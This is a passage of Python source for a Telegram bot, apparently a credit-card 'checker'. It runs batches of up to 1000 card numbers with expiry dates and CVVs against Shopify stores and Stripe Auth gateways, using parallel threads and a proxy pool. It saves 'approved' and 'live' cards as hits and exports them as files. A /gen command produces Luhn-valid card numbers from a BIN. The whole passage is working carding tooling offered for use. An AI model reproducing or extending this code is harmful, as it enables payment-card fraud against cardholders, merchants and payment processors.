            if len(parts) >= 4:
                masked += ":****:****"
            response += f"  {i}. `{masked}`\n"
        
        response += f"\n{LINE_THIN}\n💡 `/delproxy <number>` to delete │ `/delproxy all` to clear"
        safe_send_message(message.chat.id, response, parse_mode='Markdown')
        return
    
    if args[1].lower() == 'all':
        count = len(load_proxies())
        clear_all_proxies()
        bot.reply_to(message, f"✅ Deleted {count} proxies")
        return
    
    try:
        index = int(args[1])
        removed = delete_proxy_by_index(index)
        if removed:
            bot.reply_to(message, f"✅ Deleted proxy: `{removed}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ Invalid index. Use `/delproxy` to see list")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number. Use `/delproxy <number>` or `/delproxy all`")

# ============================================
# MASS CHECK SHOPIFY (CON BOTONES SOLO STOP Y UPDATE CADA 5 CHK)
# ============================================

@bot.message_handler(commands=['mass'])
def mass_check_command(message):
    global mass_check_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
    
    if mass_check_running:
        bot.reply_to(message, "⚠️ Mass check already in progress. Use STOP button or /stop")
        return
    
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ NO SITES AVAILABLE!\n\nPlease add sites first:\n/addsite https://store.myshopify.com")
        return
    
    cards = get_all_cards()
    if not cards:
        bot.reply_to(message, "❌ No Shopify cards saved. Send a .txt file.")
        return
    
    total = len(cards)
    if total > 1000:
        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs (your limit)\n1000 CCs will be checked")
        cards = cards[:1000]
        total = 1000
    
    stop_mass_flag = False
    mass_paused = False
    mass_check_running = True
    
    # Botones estilo foto - SOLO STOP
    control_buttons = InlineKeyboardMarkup(row_width=1)
    control_buttons.add(
        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
    )
    
    progress_bar = create_progress_bar(0, total)
    msg_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *SHOPIFY MASS CHECK*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `WAITING...`
📝 *Response:* `CONNECTING...`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Charge: *0*  │  ✅ Approved: *0*
❌ Declined: *0*  │  📊 `[0/{total}]`"""
    
    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
    
    current_mass_msg = progress_msg
    current_mass_chat_id = message.chat.id
    
    def run_shopify_mass(chat_id, msg_id):
        global mass_check_running, stop_mass_flag
        
        try:
            _run_shopify_mass_inner(chat_id, msg_id)
        finally:
            mass_check_running = False
            stop_mass_flag = False
    
    def _run_shopify_mass_inner(chat_id, msg_id):
        global mass_check_running, stop_mass_flag
        
        stats = {
            'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
            'declined': 0, 'errors': 0, 'total': total
        }
        
        completed = 0
        last_card = "WAITING..."
        last_response = "CONNECTING..."
        last_price = "$0.00"
        last_bin_info = None
        
        task_queue = Queue()
        result_queue = Queue()
        
        for card_str in cards:
            task_queue.put(card_str)
        
        for _ in range(PARALLEL_WORKERS):
            task_queue.put(None)
        
        def shopify_worker(worker_id):
            while not stop_mass_flag:
                if mass_paused:
                    time.sleep(1)
                    continue
                try:
                    card_str = task_queue.get(timeout=1)
                    if card_str is None:
                        break
                    
                    parts = card_str.split('|')
                    if len(parts) < 4:
                        result_queue.put(('error', card_str, None, worker_id))
                        continue
                    
                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                    bin_info = bin_lookup(cc[:6])
                    result = check_card_shopify(cc, month, year, cvv)
                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
                except:
                    continue
        
        workers = []
        for i in range(PARALLEL_WORKERS):
            w = threading.Thread(target=shopify_worker, args=(i,))
            w.daemon = True
            w.start()
            workers.append(w)
        
        processed_cards = set()
        update_counter = 0
        
        def send_update():
            nonlocal last_card, last_response, last_price, update_counter
            
            total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
            
            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
                progress_bar = create_progress_bar(completed, total)
                update_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *SHOPIFY MASS CHECK*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
💲 *Price:* `{last_price}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{total_approved}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
                
                if not stop_mass_flag:
                    try:
                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
                                            parse_mode='Markdown', reply_markup=control_buttons)
                    except:
                        pass
        
        start_time = time.time()
        
        while completed < total and not stop_mass_flag:
            try:
                result_data = result_queue.get(timeout=0.5)
                
                if result_data[0] == 'error':
                    card_str = result_data[1]
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    completed += 1
                    stats['errors'] += 1
                    delete_card(card_str)
                    update_counter += 1
                    send_update()
                else:
                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
                    
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    
                    category, status_msg, response_msg, price, gateway, elapsed, site_used = result
                    
                    last_card = f"{cc[:6]}******{cc[-4:]}"
                    last_response = response_msg if response_msg else status_msg
                    last_price = price
                    last_bin_info = bin_info
                    
                    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
                        if category == 'CHARGE':
                            stats['charge'] += 1
                        elif category == '3DS':
                            stats['threeds'] += 1
                        elif category == 'CVV':
                            stats['cvv'] += 1
                        elif category == 'FUNDS':
                            stats['funds'] += 1
                        
                        icon, cat_display, dot = get_status_emoji(category)
                        hit_msg = f"""{dot} *SHOPIFY ─ APPROVED* {dot}
{LINE_THIN}
💳 `{cc}|{month}|{year}|{cvv}`
🌐 {gateway}
📝 {response_msg}
💲 {price}
{LINE_THIN}"""
                        
                        try:
                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
                        except:
                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
                        
                        hit_data = {
                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
                            'category': category, 'status_msg': response_msg,
                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
                            'bin_info': bin_info,
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        save_hit(hit_data)
                    elif category == 'DECLINED':
                        stats['declined'] += 1
                    else:
                        stats['errors'] += 1
                    
                    completed += 1
                    delete_card(card_str)
                    update_counter += 1
                    send_update()
                    
            except:
                continue
        
        for w in workers:
            try:
                w.join(timeout=2)
            except:
                pass
        
        elapsed = time.time() - start_time
        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
        total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
        
        try:
            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
        except:
            pass
        
        was_stopped = stop_mass_flag
        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
        
        final_bar = create_progress_bar(completed, total)
        final_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{status_label}

`{final_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 *Charge:* {stats['charge']}
✅ *Approved:* {total_approved}
❌ *Declined:* {stats['declined']}
📊 *Total:* {completed}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏱ *Time:* {minutes}m {seconds}s"""
        
        result_keyboard = InlineKeyboardMarkup()
        result_keyboard.row(
            InlineKeyboardButton("🏆 Ver Hits", callback_data="hits"),
            InlineKeyboardButton("📦 Nuevo Mass", callback_data="mass")
        )
        
        try:
            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
                                parse_mode='Markdown', reply_markup=result_keyboard)
        except:
            pass
    
    t = threading.Thread(target=run_shopify_mass, args=(message.chat.id, progress_msg.message_id))
    t.daemon = True
    t.start()

# ============================================
# MASS CHECK STRIPE AUTH (CON BOTONES SOLO STOP Y UPDATE CADA 5 CHK)
# ============================================

@bot.message_handler(commands=['mau'])
def stripe_mass_command(message):
    """Mass check con Stripe Auth - Estilo foto"""
    global stripe_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
    
    if stripe_mass_running:
        bot.reply_to(message, "⚠️ Stripe Auth mass check already in progress. Use STOP button or /stop")
        return
    
    cards = get_all_stripe_cards()
    if not cards:
        bot.reply_to(message, "❌ No Stripe Auth cards saved. Send a .txt file with 'au' or 'stripe' in the name.")
        return
    
    total = len(cards)
    if total > 1000:
        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs (your limit)\n1000 CCs will be checked")
        cards = cards[:1000]
        total = 1000
    
    stop_mass_flag = False
    mass_paused = False
    stripe_mass_running = True
    
    # Botones estilo foto - SOLO STOP
    control_buttons = InlineKeyboardMarkup(row_width=1)
    control_buttons.add(
        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
    )
    
    progress_bar = create_progress_bar(0, total)
    msg_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *STRIPE AUTH MASS CHECK* ─ FREE

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `WAITING...`
📝 *Response:* `CONNECTING...`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💚 Live: *0*  │  🔐 3DS: *0*  │  🔶 CVV: *0*
❌ Declined: *0*  │  📊 `[0/{total}]`"""
    
    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
    
    current_mass_msg = progress_msg
    current_mass_chat_id = message.chat.id
    
    def run_stripe_mass(chat_id, msg_id):
        global stripe_mass_running, stop_mass_flag
        
        try:
            _run_stripe_mass_inner(chat_id, msg_id)
        finally:
            stripe_mass_running = False
            stop_mass_flag = False
    
    def _run_stripe_mass_inner(chat_id, msg_id):
        global stripe_mass_running, stop_mass_flag
        
        stats = {
            'live': 0, 'threeds': 0, 'cvv': 0,
            'declined': 0, 'errors': 0, 'total': total
        }
        
        completed = 0
        last_card = "WAITING..."
        last_response = "CONNECTING..."
        last_price = "FREE"
        
        task_queue = Queue()
        result_queue = Queue()
        
        for card_str in cards:
            task_queue.put(card_str)
        
        for _ in range(PARALLEL_WORKERS):
            task_queue.put(None)
        
        def stripe_worker(worker_id):
            while not stop_mass_flag:
                if mass_paused:
                    time.sleep(1)
                    continue
                try:
                    card_str = task_queue.get(timeout=1)
                    if card_str is None:
                        break
                    
                    parts = card_str.split('|')
                    if len(parts) < 4:
                        result_queue.put(('error', card_str, None, worker_id))
                        continue
                    
                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                    bin_info = bin_lookup(cc[:6])
                    result = check_stripe_auth(cc, month, year, cvv)
                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
                except:
                    continue
        
        workers = []
        for i in range(PARALLEL_WORKERS):
            w = threading.Thread(target=stripe_worker, args=(i,))
            w.daemon = True
            w.start()
            workers.append(w)
        
        processed_cards = set()
        update_counter = 0
        
        def send_update():
            nonlocal last_card, last_response, last_price, update_counter
            
            total_approved = stats['live'] + stats['threeds'] + stats['cvv']
            
            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
                progress_bar = create_progress_bar(completed, total)
                update_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *STRIPE AUTH MASS CHECK* ─ FREE

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
💲 *Price:* `{last_price}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💚 Live: *{stats['live']}*  │  🔐 3DS: *{stats['threeds']}*  │  🔶 CVV: *{stats['cvv']}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
                
                if not stop_mass_flag:
                    try:
                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
                                            parse_mode='Markdown', reply_markup=control_buttons)
                    except:
                        pass
        
        start_time = time.time()
        
        while completed < total and not stop_mass_flag:
            try:
                result_data = result_queue.get(timeout=0.5)
                
                if result_data[0] == 'error':
                    card_str = result_data[1]
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    completed += 1
                    stats['errors'] += 1
                    delete_stripe_card(card_str)
                    update_counter += 1
                    send_update()
                else:
                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
                    
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    
                    category, status_msg, response_msg, price, gateway, elapsed = result
                    
                    last_card = f"{cc[:6]}******{cc[-4:]}"
                    last_price = price if price else "FREE"
                    clean_response = response_msg
                    if clean_response.startswith('[unknown]'):
                        clean_response = clean_response.replace('[unknown]', '').strip()
                    elif clean_response.startswith('unknown'):
                        clean_response = clean_response.replace('unknown', '').strip()
                    last_response = clean_response if clean_response else status_msg
                    
                    if category in ['LIVE', '3DS', 'CVV']:
                        if category == 'LIVE':
                            stats['live'] += 1
                        elif category == '3DS':
                            stats['threeds'] += 1
                        elif category == 'CVV':
                            stats['cvv'] += 1
                        
                        icon, cat_display, dot = get_status_emoji(category)
                        hit_msg = f"""{dot} *STRIPE AUTH ─ {cat_display}* {dot}
{LINE_THIN}
💳 `{cc}|{month}|{year}|{cvv}`
🌐 {gateway}
📝 {clean_response}
💲 {price}
{LINE_THIN}"""
                        
                        try:
                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
                        except:
                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
                        
                        hit_data = {
                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
                            'category': category, 'status_msg': status_msg,
                            'response_msg': clean_response,
                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
                            'bin_info': bin_info,
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        save_stripe_hit(hit_data)
                    elif category == 'DECLINED':
                        stats['declined'] += 1
                    else:
                        stats['errors'] += 1
                    
                    completed += 1
                    delete_stripe_card(card_str)
                    update_counter += 1
                    send_update()
                    
            except:
                continue
        
        for w in workers:
            try:
                w.join(timeout=2)
            except:
                pass
        
        elapsed = time.time() - start_time
        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
        total_approved = stats['live'] + stats['threeds'] + stats['cvv']
        
        try:
            sqlite_backup.update_daily_stats(0, 0, 0, 0, completed, total_approved, current_mode)
        except:
            pass
        
        was_stopped = stop_mass_flag
        status_label = "🛑 *STRIPE AUTH STOPPED*" if was_stopped else "🏁 *STRIPE AUTH COMPLETED*"
        
        final_bar = create_progress_bar(completed, total)
        final_text = f"""🔓 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{status_label}

`{final_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💚 *Live:* {stats['live']}
🔐 *3DS:* {stats['threeds']}
🔶 *CVV:* {stats['cvv']}
❌ *Declined:* {stats['declined']}
📊 *Total:* {completed}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏱ *Time:* {minutes}m {seconds}s"""
        
        result_keyboard = InlineKeyboardMarkup()
        result_keyboard.row(
            InlineKeyboardButton("🔓 Ver AU Hits", callback_data="stripe_hits"),
            InlineKeyboardButton("🔓 Nuevo AU Mass", callback_data="stripe_mass")
        )
        
        try:
            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
                                parse_mode='Markdown', reply_markup=result_keyboard)
        except:
            pass
    
    t = threading.Thread(target=run_stripe_mass, args=(message.chat.id, progress_msg.message_id))
    t.daemon = True
    t.start()

# ============================================
# HITS COMMANDS
# ============================================

@bot.message_handler(commands=['auhits'])
def stripe_hits_command(message):
    hits = get_stripe_hits()
    if not hits:
        bot.reply_to(message, "📭 No Stripe Auth approved cards yet.")
        return
    
    content = "═" * 50 + "\n"
    content += f"  🔓 STRIPE AUTH {BOT_VERSION} - APPROVED CARDS (FREE)\n"
    content += f"  📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    content += "═" * 50 + "\n\n"
    
    for i, hit in enumerate(hits, 1):
        content += f"━━ [{i}] {hit.get('category', 'UNKNOWN')} ━━\n"
        content += f"  💳 CC: {hit.get('cc', '')}|{hit.get('month', '')}|{hit.get('year', '')}|{hit.get('cvv', '')}\n"
        content += f"  📝 Status: {hit.get('status_msg', '')}\n"
        content += f"  📝 Response: {hit.get('response_msg', '')}\n"
        content += f"  💲 Price: {hit.get('price', 'FREE')}\n"
        content += f"  🌐 Gateway: {hit.get('gateway', 'Stripe Auth')}\n"
        content += f"  ⏱ Time: {hit.get('elapsed', 0)}s\n"
        if hit.get('bin_info'):
            content += f"  🏦 BIN: {hit.get('bin_info', {}).get('info', '')}\n"
            content += f"  🏦 Bank: {hit.get('bin_info', {}).get('bank', '')}\n"
            content += f"  🌍 Country: {hit.get('bin_info', {}).get('country', '')}\n"
        content += "┄" * 40 + "\n\n"
    
    content += "═" * 50 + "\n"
    content += f"  🏆 TOTAL STRIPE HITS: {len(hits)}\n"
    content += "═" * 50 + "\n"
    
    file_data = BytesIO(content.encode('utf-8'))
    file_data.name = f"stripe_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(message.chat.id, file_data, caption=f"🔓 {len(hits)} Stripe Auth approved cards")

@bot.message_handler(commands=['clearau'])
def clear_stripe_command(message):
    count = len(get_all_stripe_cards())
    if count == 0:
        bot.reply_to(message, "📭 No Stripe Auth cards to delete.")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ YES", callback_data="confirm_clear_stripe"),
        InlineKeyboardButton("❌ NO", callback_data="cancel_clear")
    )
    bot.reply_to(message, f"⚠️ *CONFIRM DELETE*\n\nDelete {count} Stripe Auth cards?\nThis action cannot be undone.", 
                 parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['clearshopify'])
def clear_shopify_command(message):
    count = len(get_all_cards())
    if count == 0:
        bot.reply_to(message, "📭 No Shopify cards to delete.")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ YES", callback_data="confirm_clear_shopify"),
        InlineKeyboardButton("❌ NO", callback_data="cancel_clear")
    )
    bot.reply_to(message, f"⚠️ *CONFIRM DELETE*\n\nDelete {count} Shopify cards?\nThis action cannot be undone.", 
                 parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['stop'])
def stop_mass_check(message):
    global mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag
    if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
        stop_mass_flag = True
        bot.reply_to(message, f"🛑 *Stopping mass check...*\n{LINE_THIN}\nPlease wait while workers finish...", parse_mode='Markdown')
        try:
            if current_mass_msg and current_mass_chat_id:
                bot.edit_message_text(f"""🛑 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ *STOPPING MASS CHECK...*

Please wait while workers finish...""",
                    chat_id=current_mass_chat_id, message_id=current_mass_msg.message_id,
                    parse_mode='Markdown')
        except:
            pass
        def force_reset():
            global mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag
            time.sleep(15)
            mass_check_running = False
            stripe_mass_running = False
            sc_mass_running = False
            b3_mass_running = False
            stop_mass_flag = False
        t = threading.Thread(target=force_reset, daemon=True)
        t.start()
    else:
        bot.reply_to(message, "ℹ️ No active mass check")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    sites = load_sites()
    proxies = load_proxies()
    cards = get_all_cards()
    stripe_cards = get_all_stripe_cards()
    sc_cards = get_all_sc_cards()
    b3_cards = get_all_b3_cards()
    hits = get_hits()
    stripe_hits = get_stripe_hits()
    sc_hits_data = get_sc_hits()
    b3_hits_data = get_b3_hits()
    permanent = sqlite_backup.get_permanent_sites()
    
    stats_text = f"""📊 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 *STATISTICS PANEL*

🛒 *━━ SHOPIFY ━━*
   ├ 💳 Queued: *{len(cards)}*
   ├ 🏆 Hits: *{len(hits)}*
   ├ 🌐 Sites: *{len(sites)}*
   └ 🔒 Permanent: *{len(permanent)}*

🔓 *━━ STRIPE AUTH (FREE) ━━*
   ├ 💳 Queued: *{len(stripe_cards)}*
   └ 🏆 Hits: *{len(stripe_hits)}*

💳 *━━ STRIPE CHARGE ━━*
   ├ 💳 Queued: *{len(sc_cards)}*
   └ 🏆 Hits: *{len(sc_hits_data)}*

🔐 *━━ BRAINTREE AUTH ━━*
   ├ 💳 Queued: *{len(b3_cards)}*
   └ 🏆 Hits: *{len(b3_hits_data)}*

⚙️ *━━ SYSTEM ━━*
   ├ 📡 Proxies: *{len(proxies)}*
   ├ 👷 Workers: *{current_max_workers}*
   └ 🎮 Mode: *{current_mode}* ({PARALLEL_WORKERS}x)
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
    safe_send_message(message.chat.id, stats_text, parse_mode='Markdown')

@bot.message_handler(commands=['hits'])
def hits_command(message):
    hits = get_hits()
    if not hits:
        bot.reply_to(message, "📭 No Shopify approved cards yet.")
        return
    content = export_hits_txt()
    if content:
        file_data = BytesIO(content.encode('utf-8'))
        file_data.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        bot.send_document(message.chat.id, file_data, caption=f"🏆 {len(hits)} Shopify approved cards")

@bot.message_handler(commands=['px'])
def proxy_check_command(message):
    proxies = load_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ No proxies to check")
        return
    total = len(proxies)
    msg = bot.reply_to(message, f"⏳ Deep checking {total} proxies (3-level verification)...")
    start_time = time.time()
    alive, dead, reasons = verify_proxy_batch(proxies, deep=True)
    elapsed = time.time() - start_time
    global last_dead_proxies
    last_dead_proxies = dead
    
    socket_fail = sum(1 for r in reasons.values() if r == 'SOCKET_FAIL')
    http_fail = sum(1 for r in reasons.values() if r == 'HTTP_FAIL')
    request_fail = sum(1 for r in reasons.values() if r == 'REQUEST_FAIL')
    timeout_fail = sum(1 for r in reasons.values() if r == 'TIMEOUT')
    
    summary = f"""📡 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 *DEEP PROXY CHECK ─ 3 LEVELS*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⚡ *Speed:* {total/elapsed:.1f} proxies/s
⏱ *Time:* {elapsed:.1f}s
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✅ *Alive (all 3 tests passed):* {len(alive)}
💀 *Dead:* {len(dead)}
📊 *Total:* {total}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🔬 *Failure Breakdown:*
   ├ 🔌 Socket fail: {socket_fail}
   ├ 🌐 HTTP tunnel fail: {http_fail}
   ├ 📡 Request fail: {request_fail}
   └ ⏱ Timeout: {timeout_fail}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
📋 *Verification Levels:*
   1️⃣ TCP Socket Connection
   2️⃣ HTTP CONNECT Tunnel
   3️⃣ Real HTTPS Request
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
    markup = InlineKeyboardMarkup()
    if dead:
        markup.add(InlineKeyboardButton("🗑️ DELETE DEAD PROXIES", callback_data="delete_dead_proxies"))
    try:
        bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, 
                            parse_mode='Markdown', reply_markup=markup if markup.keyboard else None)
    except:
        bot.edit_message_text(summary.replace('*', ''), chat_id=message.chat.id, 
                            message_id=msg.message_id, reply_markup=markup if markup.keyboard else None)

@bot.message_handler(commands=['addsite'])
def add_site_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /addsite store.myshopify.com")
        return
    url = clean_url(args[1].strip())
    if not url:
        bot.reply_to(message, "❌ Invalid URL")
        return
    if add_site(url):
        bot.reply_to(message, f"✅ Site added:\n{url}")
    else:
        bot.reply_to(message, "⚠️ Site already exists")

@bot.message_handler(commands=['listsites'])
def list_sites_command(message):
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ No sites saved")
        return
    
    permanent_urls = [s['url'] for s in sqlite_backup.get_permanent_sites()]
    permanent_sites = [s for s in sites if s in permanent_urls]
    normal_sites = [s for s in sites if s not in permanent_urls]
    
    response = f"🌐 *{BOT_NAME} ─ SITES ({len(sites)})*\n{LINE_DASH}\n\n"
    
    if permanent_sites:
        response += "🔒 *PERMANENT (never removed):*\n"
        for i, site in enumerate(permanent_sites[:10], 1):
            response += f"  {i}. `{site}`\n"
        if len(permanent_sites) > 10:
            response += f"  _... and {len(permanent_sites) - 10} more_\n"
        response += "\n"
    
    if normal_sites:
        response += "🔄 *NORMAL:*\n"
        for i, site in enumerate(normal_sites[:20], len(permanent_sites) + 1):
            response += f"  {i}. `{site}`\n"
        if len(normal_sites) > 20:
            response += f"  _... and {len(normal_sites) - 20} more_\n"
    
    response += f"\n{LINE_THIN}\n💡 Use `/addsite url` to add │ `/listsites` to view"
    safe_send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['gen'])
def gen_command(message):
    """Comando /gen - Generar tarjetas válidas con algoritmo de Luhn"""
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /gen 424242 [amount]\nExample: /gen 424242 10")
        return
    
    bin_prefix = args[1].strip()
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        bot.reply_to(message, "❌ Invalid BIN. Must be at least 6 digits. Example: /gen 424242")
        return
    
    count = 10
    if len(args) >= 3:
        try:
            count = min(int(args[2]), 50)
            count = max(1, count)
        except ValueError:
            count = 10
    
    processing_msg = bot.reply_to(message, f"⚙️ *Generating {count} cards with Luhn algorithm...*", parse_mode='Markdown')
    
    cards = generate_cards_from_bin(bin_prefix, count)
    bin_info = bin_lookup(bin_prefix[:6])
    
    response = _format_gen_response(bin_prefix, count, cards, bin_info)
    
    regen_markup = InlineKeyboardMarkup()
    regen_markup.row(
        InlineKeyboardButton("🔄 Regenerate", callback_data=f"regen_{bin_prefix}_{count}"),
        InlineKeyboardButton("📋 Copy All", callback_data=f"gencopy_{bin_prefix}_{count}")
    )
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown', reply_markup=regen_markup)
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id, reply_markup=regen_markup)

def _format_gen_response(bin_prefix, count, cards, bin_info):
    cards_text = '\n'.join([f"`{c}`" for c in cards])
    
    if bin_info:
        return f"""{get_bot_header('shopify')}

🎲 *CARD GENERATOR ─ LUHN*
{LINE_DOT}
💳 {stylize_text('BIN')}  ➜  `{bin_prefix}`
🔢 {stylize_text('Amount')}  ➜  {len(cards)}

📋 *{stylize_text('BIN Info')}*
   ├ {stylize_text('Brand')}: {bin_info.get('brand', 'Unknown')}
   ├ {stylize_text('Type')}: {bin_info.get('type', 'Unknown')}
   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}

💳 *{stylize_text('Generated Cards')}*
{cards_text}

✅ All cards pass Luhn validation
{get_bot_footer()}"""
    else:
        return f"""{get_bot_header('shopify')}

🎲 *CARD GENERATOR ─ LUHN*
{LINE_DOT}
💳 {stylize_text('BIN')}  ➜  `{bin_prefix}`
🔢 {stylize_text('Amount')}  ➜  {len(cards)}

💳 *{stylize_text('Generated Cards')}*
{cards_text}

✅ All cards pass Luhn validation
{get_bot_footer()}"""

@bot.message_handler(commands=['bin'])
def bin_command(message):
